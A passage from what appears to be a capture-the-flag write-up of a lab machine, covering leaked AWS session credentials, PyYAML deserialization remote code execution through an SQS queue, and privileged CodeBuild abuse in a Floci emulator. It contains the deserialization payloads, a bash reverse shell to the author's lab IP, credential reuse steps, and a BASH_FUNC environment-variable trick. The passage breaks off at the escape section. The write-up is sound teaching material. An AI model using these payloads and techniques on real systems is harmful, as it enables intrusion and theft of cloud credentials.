  "Token": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM",
  "Expiration": "2026-11-09T20:42:29Z"
}
```

This is leaking security credentials for the nimbus-web-role!

#### AWS Access

I’ll save the tokens into `~/.aws/credentials`, creating a profile for nimbus:

```toml
[nimbus]
aws_access_key_id = ASIAQX4PG7L2K9M3N5R8
aws_secret_access_key = bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs
aws_session_token = IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM
```

Now I can use the `--profile nimbus` option with the AWS command line utility. I’ll also need to set up the region and `endpoint_url` in `~/.aws/config`:

```toml
[profile nimbus]
region = us-east-1
endpoint_url = http://aws.nimbus.htb
output = json
```

I’m assuming the `endpoint_url` is the one on the box, since these can’t be real AWS credentials. I’ve added the `output` field based on my preference.

Now when I run this, it works:

```swift
oxdf@hacky$ aws --profile nimbus sts get-caller-identity
{
    "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
    "Account": "847219365028",
    "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
}
```

### AWS Enumeration

#### General Enumeration

I can try to read things from IAM or the secrets store, but they all come back access denied. For example, trying to list the role policies:

```ruby
oxdf@hacky$ aws --profile nimbus iam list-attached-role-policies --role-name nimbus-web-role

An error occurred (AccessDenied) when calling the ListAttachedRolePolicies operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: iam:ListAttachedRolePolicies on resource: *
oxdf@hacky$ aws --profile nimbus iam list-role-policies --role-name nimbus-web-role

An error occurred (AccessDenied) when calling the ListRolePolicies operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: unknown:ListRolePolicies on resource: *
```

The `unknown:ListRolePolicies` in the second error is odd. Real AWS would say `iam:ListRolePolicies`, which is a hint that something custom is sitting in front of this API.

I can also try to interact with S3, the bucket storage, but it’s also not allowed:

```css
oxdf@hacky$ aws --profile nimbus s3 ls s3://nimbus
An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: s3:ListBucket on resource: nimbus
```

The YAML for the website defines jobs, with a runtime. This sounds like Lambda, the serverless functions service. However, I’m not able to find anything I have permissions to do here either. For example, I’m not able to list functions:

```typescript
oxdf@hacky$ aws --profile nimbus lambda list-functions

An error occurred (403) when calling the ListFunctions operation: <ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>AccessDenied</Code>
    <Message>User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: lambda:ListFunctions on resource: *</Message>
  </Error>
  <RequestId>x5660007-amv4-16e6-21r0-8b01j71af982</RequestId>
</ErrorResponse>
```

The Simple Queue Service (SQS) is AWS’s managed message queue. I’m able to list queues:

```
oxdf@hacky$ aws --profile nimbus sqs list-queues
{
    "QueueUrls": [
        "http://floci:4566/847219365028/nimbus-jobs"
    ]
}
```

The queue URL references a host named `floci` on port 4566 (the same default port LocalStack uses). I can’t resolve `floci` from my VM, but that doesn’t matter. The AWS CLI sends every request to the configured `endpoint_url`, and the queue URL is just a parameter identifying which queue to act on.

I can get information about that queue:

```cpp
oxdf@hacky$ aws --profile nimbus sqs get-queue-attributes --queue-url http://floci:4566/847219365028/nimbus-jobs --attribute-name All
{
    "Attributes": {
        "DelaySeconds": "0",
        "MessageRetentionPeriod": "345600",
        "MaximumMessageSize": "262144",
        "VisibilityTimeout": "30",
        "QueueArn": "arn:aws:sqs:us-east-1:847219365028:nimbus-jobs",
        "CreatedTimestamp": "1794088323",
        "LastModifiedTimestamp": "1794088323",
        "ApproximateNumberOfMessages": "0",
        "ApproximateNumberOfMessagesNotVisible": "0"
    }
}
```

#### Automated AWS Enumeration

There’s a tool from andresriancho on GitHub named [enumerate-iam](https://github.com/andresriancho/enumerate-iam) that will take credentials and brute force all the different services and figure out what access the given key has. It’s 7 years old and I found it a bit janky, but it did work if I passed in both the endpoint URL and the default region as environment variables (even with the region specified on the command line):

```ruby
oxdf@hacky$ AWS_ENDPOINT_URL=http://aws.nimbus.htb AWS_DEFAULT_REGION=us-east-1 uv run enumerate-iam.py --access-key ASIAQX4PG7L2K9M3N5R8 --secret-key bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs --session-token 'IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM' --region us-east-1
2026-11-09 23:48:59,993 - 339282 - [INFO] Starting permission enumeration for access-key-id "ASIAQX4PG7L2K9M3N5R8"
2026-11-09 23:49:00,149 - 339282 - [INFO] -- Account ARN : arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a
2026-11-09 23:49:00,149 - 339282 - [INFO] -- Account Id  : 847219365028
2026-11-09 23:49:00,149 - 339282 - [INFO] -- Account Path: assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a
2026-11-09 23:49:00,173 - 339282 - [INFO] -- Account ARN : arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a
2026-11-09 23:49:00,173 - 339282 - [INFO] -- Account Id  : 847219365028
2026-11-09 23:49:00,173 - 339282 - [INFO] -- Account Path: assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a
2026-11-09 23:49:00,221 - 339282 - [INFO] Attempting common-service describe / list brute force.
2026-11-09 23:49:00,981 - 339282 - [INFO] -- sqs.list_queues() worked!
2026-11-09 23:49:01,561 - 339282 - [ERROR] Remove globalaccelerator.describe_accelerator_attributes action
2026-11-09 23:49:01,780 - 339282 - [ERROR] Remove cloudformation.describe_stack_events action
2026-11-09 23:49:02,326 - 339282 - [INFO] -- sts.get_caller_identity() worked!
2026-11-09 23:49:04,717 - 339282 - [ERROR] Remove codedeploy.list_deployment_targets action
2026-11-09 23:49:05,082 - 339282 - [ERROR] Remove codedeploy.batch_get_deployment_targets action
2026-11-09 23:49:05,131 - 339282 - [ERROR] Remove codedeploy.get_deployment_target action
```

It only finds the two calls I already knew about. As the log says, it brute forces “describe / list” calls, which are read-only. It won’t try anything that changes state, so it can’t discover write permissions like `sqs:SendMessage`. I’ll have to test those manually.

#### SQS Background

SQS gives applications a durable, distributed queue to pass messages between components without them having to talk to each other directly. A typical pattern is a producer (such as a web frontend) that drops a message onto the queue when there’s work to do, and one or more workers (consumers) that poll the queue, pull messages off, do the work, and delete them. This allows the frontend to submit the job and return immediately, and the workers process jobs on their own schedule off the request path. That matches exactly what the site advertised, an “internal job scheduler” that runs work “off the request path.”

The main API calls are:

-   `list-queues` - enumerate the queue URLs in the account
-   `get-queue-attributes` - metadata about a queue
-   `send-message` - push a message onto the queue
-   `receive-message` - poll and read messages; messages aren’t removed, just made temporarily invisible for the `VisibilityTimeout`
-   `delete-message` - remove a message after processing

Because the job scheduler almost certainly pushes submitted jobs onto a queue for the workers to execute, access to that queue is a strong lead.

#### SQS Enumeration

I can try to read from the queue, but it fails:

```typescript
oxdf@hacky$ aws --profile nimbus sqs receive-message --queue-url http://floci:4566/847219365028/nimbus-jobs

aws: [ERROR]: An error occurred (403) when calling the ReceiveMessage operation: <ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>AccessDenied</Code>
    <Message>User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: sqs:ReceiveMessage on resource: nimbus-jobs</Message>
  </Error>
  <RequestId>x5660007-amv4-16e6-21r0-8b01j71af982</RequestId>
</ErrorResponse>
```

This token doesn’t have permissions. That makes sense, as the website (where this authentication is from) doesn’t necessarily need to read from the queue. I’ll try to write:

```css
oxdf@hacky$ aws --profile nimbus sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body 'test'
{
    "MD5OfMessageBody": "098f6bcd4621d373cade4e832627b4f6",
    "MessageId": "030095a9-cd31-4df4-8d12-09fc2cb99372"
}
```

It works!

### SQS YAML Deserialization

#### POC

It’s reasonable to think that the message put into the queue is the exact message sent to the website, such as the example:

```yaml
name: nightly-db-backup
schedule: "0 2 * * *"
runtime: python3.11
```

I’ve exploited PyYAML deserialization before in [Hackvent 2020](https://0xdf.gitlab.io/hackvent2020/hard#pyyaml). If the resulting YAML is being passed in and then deserialized with Python (which is the example runtime), then I can try a deserialization payload, like [this one](https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/Python/#pyyaml) from PayloadsAllTheThings:

```yaml
!!python/object/apply:os.system ["nc 10.10.10.10 4242"]
```

With `tcpdump` listening, I’ll put that into the body with a simple `ping` payload to see if it works:

```css
oxdf@hacky$ aws --profile nimbus sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body '!!python/object/apply:os.system ["ping -c 1 10.10.15.169"]'
{
    "MD5OfMessageBody": "36b3ecad8e2d570b8c53ed65e53842b3",
    "MessageId": "02990938-d5c8-480b-805c-b917a43cfbc3"
}
```

I get a packet at `tcpdump`:

```bash
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
02:03:57.065563 IP 10.129.245.218 > 10.10.15.169: ICMP echo request, id 1, seq 1, length 64
02:03:57.065605 IP 10.10.15.169 > 10.129.245.218: ICMP echo reply, id 1, seq 1, length 64
```

That’s RCE!

#### Shell

With `nc` listening on TCP 443, I’ll replace the `ping` with a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) and resend:

```css
oxdf@hacky$ aws --profile nimbus sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body '!!python/object/apply:os.system ["bash -c \"bash -i >& /dev/tcp/10.10.15.169/443 0>&1\""]'
{
    "MD5OfMessageBody": "c236f2af130f959a5723562fa5eff7b2",
    "MessageId": "892bb713-c431-4b58-b2e9-467bdbf97c72"
}
```

It connects:

```
oxdf@hacky$ sudo nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.245.218 46244
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
worker@6d1b85675039:/app$
```

I’ll upgrade my shell using [the standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```bash
worker@6d1b85675039:/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
worker@6d1b85675039:/app$ ^Z
[1]+  Stopped                 sudo nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
sudo nc -lnvp 443
                 ‍reset
reset: unknown terminal type unknown
Terminal type? screen
worker@6d1b85675039:/app$
```

`user.txt` is in `/home/worker/`:

```
worker@6d1b85675039:~$ cat user.txt
92b36695************************
```

## Shell as root

### Enumeration

#### Users

worker’s home directory is very empty:

```
worker@6d1b85675039:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .profile  user.txt
```

There are no other users with home directories in `/home`:

```
worker@6d1b85675039:/home$ ls
worker
```

That matches the users with shells set in `passwd`:

```bash
worker@6d1b85675039:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
worker:x:1000:1000::/home/worker:/bin/bash
```

#### Container

The hostname here is 6d1b85675039, which is a typical default Docker container hostname. The hosts file shows this host as 172.18.0.3, and `aws.nimbus.htb` as.1:

```
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::  ip6-localnet
ff00::  ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.18.0.1      aws.nimbus.htb
172.18.0.1      nimbus.htb
172.18.0.3      6d1b85675039
```

`fib_trie` confirms this is.3:

```sql
worker@6d1b85675039:/$ cat /proc/net/fib_trie
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.18.0.0/16 2 0 2
        +-- 172.18.0.0/30 2 0 2
           |-- 172.18.0.0
              /16 link UNICAST
           |-- 172.18.0.3
              /32 host LOCAL
        |-- 172.18.255.255
           /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.18.0.0/16 2 0 2
        +-- 172.18.0.0/30 2 0 2
           |-- 172.18.0.0
              /16 link UNICAST
           |-- 172.18.0.3
              /32 host LOCAL
        |-- 172.18.255.255
           /32 link BROADCAST
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

There’s also the Floci references in the AWS URLs. [Floci](https://floci.io/) is a local cloud solution like LocalStack. That’s running on.2:

```
worker@6d1b85675039:/$ getent hosts floci
172.18.0.2      floci
```

#### AWS

The source for the worker that takes the messages off the queue and runs them is in `worker.py` in `/app`. There’s nothing super useful about this code for moving forward, but I will look at it in [Beyond Root](#worker).

The AWS creds used by the worker are stored in environment variables:

```bash
worker@6d1b85675039:/app$ env | grep -i aws
AWS_DEFAULT_REGION=us-east-1
AWS_SECRET_ACCESS_KEY=dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh
QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs
AWS_ACCESS_KEY_ID=AKIA7P3R9X4K8M2L5VHN
AWS_ENDPOINT_URL=http://aws.nimbus.htb   
```

These are long-term keys (starting with `AKIA`), rather than the previous short-term keys (starting with `ASIA`). These don’t require a session token.

I can save those as a new profile in `~/.aws/credentials` and `~/.aws/config` and now I can read messages from the SQS queue:

```swift
oxdf@hacky$ aws --profile nimbus-worker sqs receive-message --queue-url http://aws.nimbus.htb/847219365028/nimbus-jobs --max-number-of-messages 10 --attribute-names All
{
    "Messages": [
        {
            "MessageId": "892bb713-c431-4b58-b2e9-467bdbf97c72",
            "ReceiptHandle": "00477986-7fac-4381-940c-6350531a9feb",
            "MD5OfBody": "c236f2af130f959a5723562fa5eff7b2",
            "Body": "!!python/object/apply:os.system [\"bash -c \\\"bash -i >& /dev/tcp/10.10.15.169/443 0>&1\\\"\"]",
            "Attributes": {
                "SenderId": "847219365028",
                "SentTimestamp": "1794282016520",
                "ApproximateReceiveCount": "4",
                "ApproximateFirstReceiveTimestamp": "1794282016521"
            }
        }
    ]
}
```

The only message is the one I sent to get a shell.

From my shell as worker, I can note something different about the endpoints. When I query `aws.nimbus.htb`, there are tight restrictions:

```
worker@6d1b85675039:/$ aws --endpoint-url http://aws.nimbus.htb iam list-roles       

An error occurred (AccessDenied) when calling the ListRoles operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-worker-role/worker is not authorized to perform: unknown:ListRoles on resource: *
```

However, if I go directly to `floci:4566`, there are no restrictions:

```
worker@6d1b85675039:/$ aws --endpoint-url http://floci:4566 iam list-roles
{
    "Roles": []
}
```

This makes sense, as Floci, like most local cloud emulators, doesn’t enforce IAM permissions by default. `floci` resolves to 172.18.0.2 on the Docker network, which I couldn’t reach from my VM, so this direct access is something the shell in the container unlocks. The box must implement auth in front of it (which I’ll show in [Beyond Root](#aws-auth-proxy)). In fact, if I go through `aws.nimbus.htb`, I’m worker:

```swift
worker@6d1b85675039:/$ aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
{
    "UserId": "AROA7P3R9X4K8M2L5VHNT:worker",
    "Account": "847219365028",
    "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-worker-role/worker"
}
```

Going directly to `http://floci:4566` I’m root:

```swift
worker@6d1b85675039:/$ aws --endpoint-url http://floci:4566 sts get-caller-identity
{
    "UserId": "847219365028",
    "Account": "847219365028",
    "Arn": "arn:aws:iam::847219365028:root"
}
```

Either of these also shows the account ID I’ve seen before, which I’ll need in a bit.

I can get the Floci version as well:

```ruby
worker@6d1b85675039:/$ curl http://floci:4566/_floci/info   
{"original_edition":"floci-always-free","version":"1.5.17","edition":"community"}
```

I can also list the running services (and use `python3 -m json.tool` to pretty print the results):

```javascript
worker@6d1b85675039:/$ curl -s http://floci:4566/_floci/health | python3 -m json.tool
{
    "edition": "community",
    "services": {
        "ssm": "running",
        "sqs": "running",
        "s3": "running",
        "dynamodb": "running",
        "sns": "running",
        "lambda": "running",
        "apigateway": "running",
        "iam": "running",
        "kafka": "running",
        "elasticache": "running",
        "rds": "running",
        "neptune": "running",
        "events": "running",
        "scheduler": "running",
        "logs": "running",
        "monitoring": "running",
        "secretsmanager": "running",
        "apigatewayv2": "running",
        "kinesis": "running",
        "kms": "running",
        "cognito-idp": "running",
        "states": "running",
        "cloudformation": "running",
        "acm": "running",
        "athena": "running",
        "glue": "running",
        "firehose": "running",
        "email": "running",
        "es": "running",
        "ec2": "running",
        "ecs": "running",
        "appconfig": "running",
        "appconfigdata": "running",
        "ecr": "running",
        "tagging": "running",
        "bedrock-runtime": "running",
        "eks": "running",
        "pipes": "running",
        "elasticloadbalancing": "running",
        "codebuild": "running",
        "codedeploy": "running",
        "autoscaling": "running",
        "backup": "running",
        "transfer": "running",
        "route53": "running",
        "textract": "running",
        "pricing": "running",
        "transcribe": "running",
        "ce": "running",
        "cur": "running",
        "bcm-data-exports": "running"
    },
    "version": "1.5.17",
    "original_edition": "floci-always-free"
}
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

There’s a lot to explore here, and a lot of rabbit holes / dead ends. I don’t know a good way to identify the path that works besides trying a lot of these.

### Abusing CodeBuild

#### Background

CodeBuild is AWS’s managed build / CI service. Instead of maintaining a build server, an account defines a build project and AWS spins up a fresh container, runs the build steps inside it, and tears it down. A project defines a source, an environment, a specification for what shell commands to run (“buildspec”), and an IAM role for the build.

CodeBuild exists partly so teams can build their own Docker images as part of CI, which requires running a Docker daemon inside the build container (“Docker-in-Docker”). To allow that, setting `privilegedMode: true` launches the build container with Docker’s `--privileged` flag. This is something I can abuse. I’ve abused privileged containers before in [HTB: Ready](https://0xdf.gitlab.io/2021/05/15/htb-ready.html), using cgroups and direct access to the host filesystem.

#### Enumeration

I can list the CodeBuild projects, and there are none:

```
worker@6d1b85675039:/$ aws --endpoint-url http://floci:4566 codebuild list-projects
{
    "projects": []
}
```

Same with builds:

```
worker@6d1b85675039:/$ aws --endpoint-url http://floci:4566 codebuild list-builds  
{
    "ids": []
}
```

#### Create Project Fail

To create a project, I’ll need a few things. I’ll need an image name, and since the HTB machine won’t have internet access, it has to be an image that’s already on the box. `floci/floci` is the name of Floci’s published Docker image, and Floci is clearly running in a container here, so I’ll try that.

I’ll create a simple `create.yaml` file with the details needed for the project:

```bash
worker@6d1b85675039:/$ cat > /tmp/create.yaml <<'EOF'
> name: 0xdf-build
> source:
>   type: NO_SOURCE
>   buildspec: |
>     version: 0.2
>     phases:
>       build:
>         commands:
>           - id
> artifacts:
>   type: NO_ARTIFACTS
> environment:
>   type: LINUX_CONTAINER
>   image: floci/floci:latest
>   computeType: BUILD_GENERAL1_SMALL
>   privilegedMode: true
> serviceRole: arn:aws:iam::847219365028:role/service-role/codebuild
> EOF
```

That specifies the `buildspec`, as well as the artifacts, environment, and service role. The service role has the account ID from above, and the rest is just made up (Floci doesn’t validate this).

Now I can create the project:

```swift
worker@6d1b85675039:/$ aws --endpoint-url http://floci:4566 codebuild create-project --cli-input-yaml file:///tmp/create.yaml
{
    "project": {
        "name": "0xdf-build",
        "arn": "arn:aws:codebuild:us-east-1:847219365028:project/0xdf-build",
        "source": {
            "type": "NO_SOURCE",
            "buildspec": "version: 0.2\nphases:\n  build:\n    commands:\n      - id\n"
        },
        "artifacts": {
            "type": "NO_ARTIFACTS"
        },
        "environment": {
            "type": "LINUX_CONTAINER",
            "image": "floci/floci:latest",
            "computeType": "BUILD_GENERAL1_SMALL",
            "privilegedMode": true
        },
        "serviceRole": "arn:aws:iam::847219365028:role/service-role/codebuild",
        "timeoutInMinutes": 60,
        "queuedTimeoutInMinutes": 480,
        "created": "2026-11-11T20:49:07.130000+00:00",
        "lastModified": "2026-11-11T20:49:07.130000+00:00",
        "projectVisibility": "PRIVATE"
    }
}
```

I’ll build the project:

```
worker@6d1b85675039:/$ aws --endpoint-url http://floci:4566 codebuild start-build --project-name 0xdf-build --query 'build.id'
"0xdf-build:1"
```

And check on it:

```javascript
worker@6d1b85675039:/$ aws --endpoint-url http://floci:4566 codebuild batch-get-builds --ids 0xdf-build:1 --query 'builds[0].phases[].{phaseType:phaseType,phaseStatus:phaseStatus,message:contexts[0].message}'
[
    {
        "phaseType": "SUBMITTED",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "QUEUED",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "PROVISIONING",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "DOWNLOAD_SOURCE",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "INSTALL",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "PRE_BUILD",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "BUILD",
        "phaseStatus": "FAILED",
        "message": "Exit code 128: OCI runtime exec failed: exec failed: cannot exec in a stopped container"
    },
    {
        "phaseType": "POST_BUILD",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "UPLOAD_ARTIFACTS",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "FINALIZING",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "COMPLETED",
        "phaseStatus": "FAILED",
        "message": null
    }
]
```

It fails, but the way it fails is informative. Every phase up through `PRE_BUILD` succeeds, and only the `BUILD` phase, the one that actually runs my `buildspec` commands, fails with:

```
Exit code 128: OCI runtime exec failed: exec failed: cannot exec in a stopped container
```

Floci implements CodeBuild by starting the environment image as a container (effectively a `docker run`), and then running each build phase’s commands inside it with `docker exec`. “cannot exec in a stopped container” means that by the time Floci went to exec my `id` command, the build container had already exited.

This error also confirms these are real Docker containers, not something Floci simulates. Like any container, a build container shares the kernel with everything else on the host, and with `privilegedMode` it runs with `--privileged`, which gives it the access to that kernel I’ll need to escape.

The `floci/floci` image I selected isn’t a purpose-built CodeBuild image with a long-running build agent, but rather the Floci server image. Its entrypoint is a shell script that, when it sees it’s running as root, does some setup and then drops privileges and re-execs the server as a lower-privileged user. In a throwaway build container that process has nothing to keep it busy and exits almost immediately, so the container stops before the `BUILD` phase gets a chance to exec into it.

#### Create Project with BASH_FUNC_name%%

I need a way to keep the running process going. I could switch to another image, but I can’t identify any on this host that will work for that. Instead, I’ll trick the process into thinking it’s running as a non-root user, which will have it enter the long running process (long enough to `exec` my commands).

The trick is to use an environment variable named `BASH_FUNC_name%%`, which is how bash passes exported functions to child processes. When bash starts, it imports any variable in that format as a function (in this example `name`) defined by the variable’s value, and that function overrides any command with the same name. The format is defined in `variables.c` (on [lines 86-89](https://fossies.org/linux/bash/variables.c)), and comes from a [hardening patch](https://sources.debian.org/data/main/b/bash/4.3-11/debian/patches/bash43-027.diff) added to bash after Shellshock ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/cve-2014-6271)).

Bash won’t let me set this variable directly, since `%` isn’t valid in a variable name, but the `export -f` builtin will create it:

```ruby
worker@6d1b85675039:/$ oxdf() { echo "hello from oxdf"; }
worker@6d1b85675039:/$ export -f oxdf
worker@6d1b85675039:/$ env | grep -A1 BASH_FUNC
BASH_FUNC_oxdf%%=() {  echo "hello from oxdf"
}
```

I can set it as an environment variable in the CodeBuild project definition. I’ll do it here in a new `create.yaml`:

```bash
worker@6d1b85675039:/$ cat > /tmp/create.yaml <<'EOF'
> name: 0xdf-bash-func
> source:
>   type: NO_SOURCE
>   buildspec: |
>     version: 0.2
>     phases:
>       build:
>         commands:
>           - id
> artifacts:
>   type: NO_ARTIFACTS
> environment:
>   type: LINUX_CONTAINER
>   image: floci/floci:latest
>   computeType: BUILD_GENERAL1_SMALL
>   privilegedMode: true
>   environmentVariables:
>     - name: "BASH_FUNC_id%%"
>       value: '() { echo "uid=1000(worker) gid=1000(worker) groups=1000(worker)"; }'
>       type: PLAINTEXT
> serviceRole: arn:aws:iam::847219365028:role/service-role/codebuild
> EOF
```

I’ll create it:

```swift
worker@6d1b85675039:/$ aws --endpoint-url http://floci:4566 codebuild create-project --cli-input-yaml file:///tmp/create.yaml
{
    "project": {
        "name": "0xdf-bash-func",
        "arn": "arn:aws:codebuild:us-east-1:847219365028:project/0xdf-bash-func",
        "source": {
            "type": "NO_SOURCE",
            "buildspec": "version: 0.2\nphases:\n  build:\n    commands:\n      - id\n"
        },
        "artifacts": {
            "type": "NO_ARTIFACTS"
        },
        "environment": {
            "type": "LINUX_CONTAINER",
            "image": "floci/floci:latest",
            "computeType": "BUILD_GENERAL1_SMALL",
            "environmentVariables": [
                {
                    "name": "BASH_FUNC_id%%",
                    "value": "() { echo \"uid=1000(worker) gid=1000(worker) groups=1000(worker)\"; }",
                    "type": "PLAINTEXT"
                }
            ],
            "privilegedMode": true
        },
        "serviceRole": "arn:aws:iam::847219365028:role/service-role/codebuild",
        "timeoutInMinutes": 60,
        "queuedTimeoutInMinutes": 480,
        "created": "2026-11-11T21:53:07.230000+00:00",
        "lastModified": "2026-11-11T21:53:07.230000+00:00",
        "projectVisibility": "PRIVATE"
    }
}
```

Then build it:

```
worker@6d1b85675039:/$ aws --endpoint-url http://floci:4566 codebuild start-build --project-name 0xdf-bash-func --query 'build.id'
"0xdf-bash-func:1"
```

Checking it, everything looks successful:

```javascript
worker@6d1b85675039:/$ aws --endpoint-url http://floci:4566 codebuild batch-get-builds --ids 0xdf-bash-func:1 --query 'builds[0].phases[].{phaseType:phaseType,phaseStatus:phaseStatus,message:contexts[0].message}'
[
    {
        "phaseType": "SUBMITTED",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "QUEUED",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "PROVISIONING",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "DOWNLOAD_SOURCE",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "INSTALL",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "PRE_BUILD",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "BUILD",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "POST_BUILD",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "UPLOAD_ARTIFACTS",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "FINALIZING",
        "phaseStatus": "SUCCEEDED",
        "message": null
    },
    {
        "phaseType": "COMPLETED",
        "phaseStatus": "SUCCEEDED",
        "message": null
    }
]
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

The `BUILD` phase succeeded this time, which means the container stayed up long enough for Floci to exec my commands. I can try to read the logs, but it doesn’t work. So I don’t know if I’ve managed to get execution as root or not.

#### Escape

